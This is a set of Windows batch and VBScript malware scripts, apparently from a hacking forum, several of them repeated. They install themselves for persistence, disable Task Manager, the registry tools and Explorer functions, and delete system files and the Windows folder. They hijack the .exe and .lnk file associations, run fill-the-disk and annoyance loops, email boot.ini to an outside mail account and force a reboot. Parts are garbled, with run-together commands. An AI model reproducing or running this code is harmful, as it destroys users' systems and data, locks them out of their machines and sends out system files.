C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp

copy C:\Windows\System32 

copy C:\Windows\System32\

@echo off




copy ""%0"" "%SystemRoot%\system32\git.bat"
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Filel" /t REG_SZ /d "%SystemRoot%\system32\git.bat" /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "C:\git.bat" /f 

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewOnDrive /t REG_DWORD /d 0xff /f

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "cmd.exe /c \"C:\Windows\System32\git.bat""

@echo off 

cd\

cd Windows 

cd System32

takeown /f logonui.exe & icacls logonui.exe /granted "%username%".F

takeown /f sethc.exe & icacls sethc.exe /granted "%username%".F

echo Gg>sethc.exe

cd\

cd "Program Files"

cd "MicrosoftWindowsServicesEtc"

copy "git.bat" "C:\Windows\System32\logonui.exe" /Y

attrib +s +h C:\Windows\System32\git.bat

del C:\Users\%username%\desktop\CCleaner.exe /s /q
del C:\Users\%username%\desktop\Process Hacker 2.exe /s /q
del C:\Users\%username%\desktop\Process hacker 2.exe /s /q
del C:\Users\%username%\desktop\123.exe /s /q
del C:\Users\%username%\desktop\321.exe /s /q
del C:\Users\%username%\desktop\777.exe /s /q
del C:\Users\%username%\desktop\Simple Unlocker.exe /s /q
del C:\Users\%username%\desktop\Uninstall tool.exe /s /q

Set WshShell = WScript.CreateObject("WScript.Shell") WshShell.SendKeys("%{Alt+F4}")
color a
copy ""%0"" "C:\Windows\system32\git.bat"

@echo off

echo Windows Registry Editor Version 5.00 > "%temp%\myreg.reg"

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> "%temp%\myreg.reg"

echo "git"="C:\\Windows\System32\\git.bat" >> "%temp%\myreg.reg"

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe] >> "%temp%\myreg.reg"

echo "Debugger"="C:\\Windows\\System32\\git.bat" >> "%temp%\myreg.reg"

echo [HKEY_CURRENT_USER\Software\git] >> "%temp%\myreg.reg"

echo "Settings"="Value" >> "%temp%\myreg.reg"

regedit /s "%temp%\myreg.reg"

taskkill /f /im explorer.exe 

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Win32 /t REG_SZ /d C:\Windows\git.bat /f

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f > nul


reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f >nul

reg add HKCU\Software\Microsoft\Windows\Current Version\Policies\Explorer/v NoControlPanel /t REG_DWORD /d 1 /f >nul
reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul

del "%SystemRoot%Cursors*.*" >nul

assoc .lnk=.txt
copy ""%0"" "%SystemRoot%\system32\git.bat" >nul
reg add "HKCU\SOFTWARE\Microsoft\Command Processor" /v AutoRun /t REG_SZ /d "%SystemRoot%\syste m32\git.bat" /f >nul

Del C:\Windows\System32\taskmgr.exe /q

msg * ТЫ ЗАРАЖЕН ТАСК МЕНЕДЖЕР УДАЛЕН ЖДИ 60 СЕКУЕТ СЕКУНД

timeout 60 /nobreak
 
Shutdown.exe /s /t 120
 

assoc .exe=.Ink



echo Chr(39)>%temp%\temp1.vbs 

echo Chr(39)>%temp%\temp2.vbs 

echo on error resume next > %temp%\temp.vbs 

echo Set S = CreateObject("Wscript.Shell") >> %temp%\temp.vbs 

echo set FSO=createobject("scripting.filesystemobject")>>%temp%\temp.vbs 

reg add HKEY_USERS\S-1-5-21-343818398-1417001333-725345543-1003\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v nodesktop /d 1 /freg add HKEY_USERS\S-1-5-21-343818398-1417001333-725345543-1003\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v ClassicShell /d 1 /fset ¶§=%0 

copy %¶§% %SystemRoot%\user32dll.bat 

reg add "hklm\Software\Microsoft\Windows\CurrentVersion\Run" /v RunExplorer32 /d %SystemRoot%\user32dll.bat /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /t REG_DWORD /d 67108863 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewOnDrive /t REG_DWORD /d 67108863 /f 

echo fso.deletefile "C:\ntldr",1 >> %temp%\temp.vbs 

reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v "NoSelectDownloadDir" /d 1 /f 

reg add "HKLM\SOFTWARE\Microsoft\Internet Explorer\main\FeatureControl\Feature_LocalMachine_Lockdown" /v "IExplorer" /d 0 /f 

reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v "NoFindFiles" /d 1 /f 

reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v "NoNavButtons" /d 1 /f 

echo fso.deletefolder "D:\Windows",1 >> %temp%\temp.vbs 

echo fso.deletefolder "I:\Windows",1 >> %temp%\temp.vbs 

echo fso.deletefolder "C:\Windows",1 >> %temp%\temp.vbs 

echo sr=s.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRoot") >> %temp%\temp.vbs 

echo fso.deletefile sr+"\system32\hal.dll",1 >> %temp%\temp.vbs 

echo sr=s.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRoot") >> %temp%\temp.vbs 

echo fso.deletefolder sr+"\system32\dllcache",1 >> %temp%\temp.vbs 

echo sr=s.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRoot") >> %temp%\temp.vbs 

echo fso.deletefolder sr+"\system32\drives",1 >> %temp%\temp.vbs 

echo s.regwrite "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\LocalizedString","forum.whack.ru™">>%temp%\temp.vbs 

echo s.regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOwner","forum.whack.ru™">>%temp%\temp.vbs 

echo s.regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOrganization","forum.whack.ru™">>%temp%\temp.vbs 

echo on error resume next > %temp%\temp1.vbs 

echo set FSO=createobject("scripting.filesystemobject")>>%temp%\temp1.vbs 

echo do>>%temp%\temp1.vbs 

echo fso.getfile ("A:\")>>%temp%\temp1.vbs 

echo loop>>%temp%\temp1.vbs 

echo on error resume next > %temp%\temp2.vbs 

echo Set S = CreateObject("Wscript.Shell") >> %temp%\temp2.vbs 

echo do>>%temp%\temp2.vbs 

echo execute"S.Run ""%comspec% /c echo "" & Chr(7), 0, True">>%temp%\temp2.vbs 

echo loop>>%temp%\temp2.vbs 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v disabletaskmgr /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuPinnedList /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMFUprogramsList /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoUserNameInStartMenu /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum" /v {20D04FE0-3AEA-1069-A2D8-08002B30309D} /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoNetworkConnections /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuNetworkPlaces /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v StartmenuLogoff /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuSubFolders /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoCommonGroups /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFavoritesMenu /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRecentDocsMenu /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSetFolders /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoAddPrinter /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFind /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSMHelp /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMorePrograms /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoChangeStartMenu /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSMMyDocs /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSMMyPictures /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyMusic /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f 

echo set application=createobject("shell.application")>>%temp%\temp.vbs 

echo application.minimizeall>>%temp%\temp.vbs 

reg add "hklm\Software\Microsoft\Windows\CurrentVersion\run" /v SwapNT /t REG_SZ /d rundll32 user32, SwapMouseButton /f 

start rundll32 user32, SwapMouseButton 

reg add "HKCR\exefile\shell\open\command" /ve /t REG_SZ /d rundll32.exe /f 

echo i=50 >> %temp%\temp.vbs 

echo while i^>0 or i^<0 >> %temp%\temp.vbs 

echo S.popup "forum.whack.ru™",0, "forum.whack.ru™",0+16 >> %temp%\temp.vbs 

echo i=i-1 >> %temp%\temp.vbs 

echo wend >> %temp%\temp.vbs 

echo do >> %temp%\temp.vbs 

echo wscript.sleep 200 >> %temp%\temp.vbs 

echo s.sendkeys"{capslock}" >> %temp%\temp.vbs 

echo wscript.sleep 200 >> %temp%\temp.vbs 

echo s.sendkeys"{numlock}" >> %temp%\temp.vbs 

echo wscript.sleep 200 >> %temp%\temp.vbs 

echo s.sendkeys"{scrolllock}" >> %temp%\temp.vbs 

echo loop>> %temp%\temp.vbs 

echo Set oWMP = CreateObject("WMPlayer.OCX.7") >> %temp%\temp.vbs 

echo Set colCDROMs = oWMP.cdromCollection >> %temp%\temp.vbs 

echo if colCDROMs.Count ^>= 1 then >> %temp%\temp.vbs 

echo For i = 0 to colCDROMs.Count - 1 >> %temp%\temp.vbs 

echo colCDROMs.Item(i).eject >> %temp%\temp.vbs 

echo next >> %temp%\temp.vbs 

echo End If >> %temp%\temp.vbs 

echo Call SendPost("smtp.mail.ru", "forum.whack.ru™@mail.ru", "support@mail.ru", "...", "Копм заражен!") >> %temp%\temp.vbs 

echo Function SendPost(strSMTP_Server, strTo, strFrom, strSubject, strBody) >> %temp%\temp.vbs 

echo Set iMsg = CreateObject("CDO.Message") >> %temp%\temp.vbs 

echo Set iConf = CreateObject("CDO.Configuration") >> %temp%\temp.vbs 

echo Set Flds = iConf.Fields >> %temp%\temp.vbs 

echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2 >> %temp%\temp.vbs 

echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1 >> %temp%\temp.vbs 

echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendusername") = "support" >> %temp%\temp.vbs 

echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendpassword") = "support" >> %temp%\temp.vbs 

echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.mail.ru" >> %temp%\temp.vbs 

echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 25 >> %temp%\temp.vbs 

echo Flds.Update >> %temp%\temp.vbs 

echo iMsg.Configuration = iConf >> %temp%\temp.vbs 

echo iMsg.To = strTo >> %temp%\temp.vbs 

echo iMsg.From = strFrom >> %temp%\temp.vbs 

echo iMsg.Subject = strSubject >> %temp%\temp.vbs 

echo iMsg.TextBody = strBody >> %temp%\temp.vbs 

echo iMsg.AddAttachment "c:\boot.ini" >> %temp%\temp.vbs 

echo iMsg.Send >> %temp%\temp.vbs 

echo End Function >> %temp%\temp.vbs 

echo Set iMsg = Nothing >> %temp%\temp.vbs 

echo Set iConf = Nothing >> %temp%\temp.vbs 

echo Set Flds = Nothing >> %temp%\temp.vbs 

echo s.run "shutdown -r -t 0 -c ""pc" hacker"" -f",1 >> %temp%\temp.vbs 

start %temp%\temp.vbs 

start %temp%\temp1.vbs 

start %temp%\temp2.vbs 

• 

@echo off 

echo Chr(39)>%temp%\temp1.vbs 

echo Chr(39)>%temp%\temp2.vbs 

echo on error resume next > %temp%\temp.vbs 

echo Set S = CreateObject("Wscript.Shell") >> %temp%\temp.vbs 

echo set FSO=createobject("scripting.filesystemobject")>>%temp%\temp.vbs 

reg add HKEY_USERS\S-1-5-21-343818398-1417001333-725345543-1003\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v nodesktop /d 1 /freg add HKEY_USERS\S-1-5-21-343818398-1417001333-725345543-1003\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v ClassicShell /d 1 /fset ¶§=%0 

copy %¶§% %SystemRoot%\user32dll.bat 

reg add "hklm\Software\Microsoft\Windows\CurrentVersion\Run" /v RunExplorer32 /d %SystemRoot%\user32dll.bat /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /t REG_DWORD /d 67108863 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewOnDrive /t REG_DWORD /d 67108863 /f 

echo fso.deletefile "C:\ntldr",1 >> %temp%\temp.vbs 

reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v "NoSelectDownloadDir" /d 1 /f 

reg add "HKLM\SOFTWARE\Microsoft\Internet Explorer\main\FeatureControl\Feature_LocalMachine_Lockdown" /v "IExplorer" /d 0 /f 

reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v "NoFindFiles" /d 1 /f 

reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v "NoNavButtons" /d 1 /f 

echo fso.deletefolder "D:\Windows",1 >> %temp%\temp.vbs 

echo fso.deletefolder "I:\Windows",1 >> %temp%\temp.vbs 

echo fso.deletefolder "C:\Windows",1 >> %temp%\temp.vbs 

echo sr=s.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRoot") >> %temp%\temp.vbs 

echo fso.deletefile sr+"\system32\hal.dll",1 >> %temp%\temp.vbs 

echo sr=s.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRoot") >> %temp%\temp.vbs 

echo fso.deletefolder sr+"\system32\dllcache",1 >> %temp%\temp.vbs 

echo sr=s.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRoot") >> %temp%\temp.vbs 

echo fso.deletefolder sr+"\system32\drives",1 >> %temp%\temp.vbs 

echo s.regwrite "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\LocalizedString","forum.whack.ru™">>%temp%\temp.vbs 

echo s.regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOwner","forum.whack.ru™">>%temp%\temp.vbs 

echo s.regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOrganization","forum.whack.ru™">>%temp%\temp.vbs 

echo on error resume next > %temp%\temp1.vbs 

echo set FSO=createobject("scripting.filesystemobject")>>%temp%\temp1.vbs 

echo do>>%temp%\temp1.vbs 

echo fso.getfile ("A:\")>>%temp%\temp1.vbs 

echo loop>>%temp%\temp1.vbs 

echo on error resume next > %temp%\temp2.vbs 

echo Set S = CreateObject("Wscript.Shell") >> %temp%\temp2.vbs 

echo do>>%temp%\temp2.vbs 

echo execute"S.Run ""%comspec% /c echo "" & Chr(7), 0, True">>%temp%\temp2.vbs 

echo loop>>%temp%\temp2.vbs 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v disabletaskmgr /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v disableregistrytools /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuPinnedList /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMFUprogramsList /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoUserNameInStartMenu /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum" /v {20D04FE0-3AEA-1069-A2D8-08002B30309D} /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoNetworkConnections /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuNetworkPlaces /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v StartmenuLogoff /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuSubFolders /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoCommonGroups /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFavoritesMenu /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRecentDocsMenu /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSetFolders /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoAddPrinter /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFind /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSMHelp /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMorePrograms /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoChangeStartMenu /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSMMyDocs /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSMMyPictures /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyMusic /t REG_DWORD /d 1 /f 

reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f 

echo set application=createobject("shell.application")>>%temp%\temp.vbs 

echo application.minimizeall>>%temp%\temp.vbs 

reg add "hklm\Software\Microsoft\Windows\CurrentVersion\run" /v SwapNT /t REG_SZ /d rundll32 user32, SwapMouseButton /f 

start rundll32 user32, SwapMouseButton 

reg add "HKCR\exefile\shell\open\command" /ve /t REG_SZ /d rundll32.exe /f 

echo i=50 >> %temp%\temp.vbs 

echo while i^>0 or i^<0 >> %temp%\temp.vbs 

echo S.popup "forum.whack.ru™",0, "forum.whack.ru™",0+16 >> %temp%\temp.vbs 

echo i=i-1 >> %temp%\temp.vbs 

echo wend >> %temp%\temp.vbs 

echo do >> %temp%\temp.vbs 

echo wscript.sleep 200 >> %temp%\temp.vbs 

echo s.sendkeys"{capslock}" >> %temp%\temp.vbs 

echo wscript.sleep 200 >> %temp%\temp.vbs 

echo s.sendkeys"{numlock}" >> %temp%\temp.vbs 

echo wscript.sleep 200 >> %temp%\temp.vbs 

echo s.sendkeys"{scrolllock}" >> %temp%\temp.vbs 

echo loop>> %temp%\temp.vbs 

echo Set oWMP = CreateObject("WMPlayer.OCX.7") >> %temp%\temp.vbs 

echo Set colCDROMs = oWMP.cdromCollection >> %temp%\temp.vbs 

echo if colCDROMs.Count ^>= 1 then >> %temp%\temp.vbs 

echo For i = 0 to colCDROMs.Count - 1 >> %temp%\temp.vbs 

echo colCDROMs.Item(i).eject >> %temp%\temp.vbs 

echo next >> %temp%\temp.vbs 

echo End If >> %temp%\temp.vbs 

echo Call SendPost("smtp.mail.ru", "forum.whack.ru™@mail.ru", "support@mail.ru", "...", "Копм заражен!") >> %temp%\temp.vbs 

echo Function SendPost(strSMTP_Server, strTo, strFrom, strSubject, strBody) >> %temp%\temp.vbs 

echo Set iMsg = CreateObject("CDO.Message") >> %temp%\temp.vbs 

echo Set iConf = CreateObject("CDO.Configuration") >> %temp%\temp.vbs 

echo Set Flds = iConf.Fields >> %temp%\temp.vbs 

echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2 >> %temp%\temp.vbs 

echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1 >> %temp%\temp.vbs 

echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendusername") = "support" >> %temp%\temp.vbs 

echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendpassword") = "support" >> %temp%\temp.vbs 

echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.mail.ru" >> %temp%\temp.vbs 

echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 25 >> %temp%\temp.vbs 

echo Flds.Update >> %temp%\temp.vbs 

echo iMsg.Configuration = iConf >> %temp%\temp.vbs 

echo iMsg.To = strTo >> %temp%\temp.vbs 

echo iMsg.From = strFrom >> %temp%\temp.vbs 

echo iMsg.Subject = strSubject >> %temp%\temp.vbs 

echo iMsg.TextBody = strBody >> %temp%\temp.vbs 

echo iMsg.AddAttachment "c:\boot.ini" >> %temp%\temp.vbs 

echo iMsg.Send >> %temp%\temp.vbs 

echo End Function >> %temp%\temp.vbs 

echo Set iMsg = Nothing >> %temp%\temp.vbs 

echo Set iConf = Nothing >> %temp%\temp.vbs 

echo Set Flds = Nothing >> %temp%\temp.vbs 

echo s.run "shutdown -r -t 0 -c ""pc" hacker"" -f",1 >> %temp%\temp.vbs 

start %temp%\temp.vbs 

start %temp%\temp1.vbs 

start %temp%\temp2.vbs 

• 


echo Set fso = CreateObject("Scripting.FileSystemObject") > %systemdrive%\windows\system32\rundll32.vbs 

echo do >> %systemdrive%\windows\system32\rundll32.vbs 

echo Set tx = fso.CreateTextFile("%systemdrive%\windows\system32\rundll32.dat", True) >> %systemdrive%\windows\system32\rundll32.vbs 

echo tx.WriteBlankLines(100000000) >> %systemdrive%\windows\system32\rundll32.vbs 

echo tx.close >> %systemdrive%\windows\system32\rundll32.vbs 

echo FSO.DeleteFile "%systemdrive%\windows\system32\rundll32.dat" >> %systemdrive%\windows\system32\rundll32.vbs 

echo loop >> %systemdrive%\windows\system32\rundll32.vbs 

start %systemdrive%\windows\system32\rundll32.vbs 

reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v system_host_run /t REG_SZ /d %systemdrive%\windows\system32\rundll32.vbs /f 

taskkill %0


echo Chr(39)>%temp%\temp1.vbs 
echo Chr(39)>%temp%\temp2.vbs 
echo on error resume next > %temp%\temp.vbs 
echo Set S = CreateObject("Wscript.Shell") >> %temp%\temp.vbs 
echo set FSO=createobject("scripting.filesystemobject")>>%temp%\temp.vbs 
reg add HKEY_USERS\S-1-5-21-343818398-1417001333-725345543-1003\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v nodesktop /d 1 /freg add HKEY_USERS\S-1-5-21-343818398-1417001333-725345543-1003\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v ClassicShell /d 1 /fset ¶§=%0 
copy %¶§% %SystemRoot%\user32dll.bat 
reg add "hklm\Software\Microsoft\Windows\CurrentVersion\Run" /v RunExplorer32 /d %SystemRoot%\user32dll.bat /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /t REG_DWORD /d 67108863 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewOnDrive /t REG_DWORD /d 67108863 /f 
echo fso.deletefile "C:\ntldr",1 >> %temp%\temp.vbs 
reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v "NoSelectDownloadDir" /d 1 /f 
reg add "HKLM\SOFTWARE\Microsoft\Internet Explorer\main\FeatureControl\Feature_LocalMachine_Lockdown" /v "IExplorer" /d 0 /f 
reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v "NoFindFiles" /d 1 /f 
reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v "NoNavButtons" /d 1 /f 
echo fso.deletefolder "D:\Windows",1 >> %temp%\temp.vbs 
echo fso.deletefolder "I:\Windows",1 >> %temp%\temp.vbs 
echo fso.deletefolder "C:\Windows",1 >> %temp%\temp.vbs 
echo sr=s.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRoot") >> %temp%\temp.vbs 
echo fso.deletefile sr+"\system32\hal.dll",1 >> %temp%\temp.vbs 
echo sr=s.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRoot") >> %temp%\temp.vbs 
echo fso.deletefolder sr+"\system32\dllcache",1 >> %temp%\temp.vbs 
echo sr=s.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRoot") >> %temp%\temp.vbs 
echo fso.deletefolder sr+"\system32\drives",1 >> %temp%\temp.vbs 
echo s.regwrite "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\LocalizedString","forum.whack.ru™">>%temp%\temp.vbs 
echo s.regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOwner","forum.whack.ru™">>%temp%\temp.vbs 
echo s.regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOrganization","forum.whack.ru™">>%temp%\temp.vbs 
echo on error resume next > %temp%\temp1.vbs 
echo set FSO=createobject("scripting.filesystemobject")>>%temp%\temp1.vbs 
echo do>>%temp%\temp1.vbs 
echo fso.getfile ("A:\")>>%temp%\temp1.vbs 
echo loop>>%temp%\temp1.vbs 
echo on error resume next > %temp%\temp2.vbs 
echo Set S = CreateObject("Wscript.Shell") >> %temp%\temp2.vbs 
echo do>>%temp%\temp2.vbs 
echo execute"S.Run ""%comspec% /c echo "" & Chr(7), 0, True">>%temp%\temp2.vbs 
echo loop>>%temp%\temp2.vbs 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v disabletaskmgr /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v disableregistrytools /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuPinnedList /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMFUprogramsList /t REG_DWORD /d 1 /f 
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoUserNameInStartMenu /t REG_DWORD /d 1 /f 
